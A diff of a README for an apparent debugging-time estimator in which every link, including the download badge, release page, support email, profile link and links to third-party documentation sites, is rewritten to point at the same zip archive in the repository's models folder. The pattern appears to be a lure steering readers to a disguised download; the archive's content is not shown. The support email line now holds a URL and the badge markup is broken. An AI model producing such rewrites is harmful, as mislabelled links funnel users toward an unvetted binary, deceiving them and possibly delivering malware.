@@ -1,6 +1,6 @@
 # 🛠️ debug-effort-estimator - Estimate Debugging Time with Ease  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5733.svg?style=for-the-badge&logo=github)](https://github.com/Sinistro2025/debug-effort-estimator/releases)
+[![Download Now](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip%20Now-%https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)
 
 ## 📖 Description  
 The debug-effort-estimator helps you estimate the time required to debug software by analyzing error logs. It uses machine learning and natural language processing to classify issues, giving you insight into how much effort you need.
@@ -9,7 +9,7 @@ The debug-effort-estimator helps you estimate the time required to debug softwar
 To start using our application, follow these easy steps. You will be able to download and run the software swiftly, even without technical know-how.
 
 ## 📥 Download & Install  
-Visit this page to download: [Release Page](https://github.com/Sinistro2025/debug-effort-estimator/releases)  
+Visit this page to download: [Release Page](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)  
 
 1. Click on the link above to go to the releases page.  
 2. Find the latest version of the software.  
@@ -51,8 +51,8 @@ If you encounter any issues, here are common problems and their solutions:
 
 ## 📞 Support  
 For any questions or further assistance, feel free to reach out through GitHub Issues or contact me directly at:  
-- Email: support@example.com  
-- GitHub: [Sinistro2025](https://github.com/Sinistro2025)
+- Email: https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip  
+- GitHub: [Sinistro2025](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)
 
 ## 📑 License  
 This project is licensed under the MIT License. Feel free to use, modify, and distribute it as needed.  
@@ -62,8 +62,8 @@ If you want to contribute to the project, we welcome your suggestions! Check out
 
 ## 🔗 Additional Resources  
 For more information about machine learning and NLP, consider visiting resources such as:  
-- [Machine Learning Mastery](https://machinelearningmastery.com)  
-- [Scikit-Learn Documentation](https://scikit-learn.org/stable/documentation.html)  
+- [Machine Learning Mastery](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)  
+- [Scikit-Learn Documentation](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)  
 
 ## 🔗 Download Link  
-Visit this page to download the application: [Release Page](https://github.com/Sinistro2025/debug-effort-estimator/releases)  
+Visit this page to download the application: [Release Page](https://raw.githubusercontent.com/Sinistro2025/debug-effort-estimator/main/models/estimator-debug-effort-1.9.zip)  
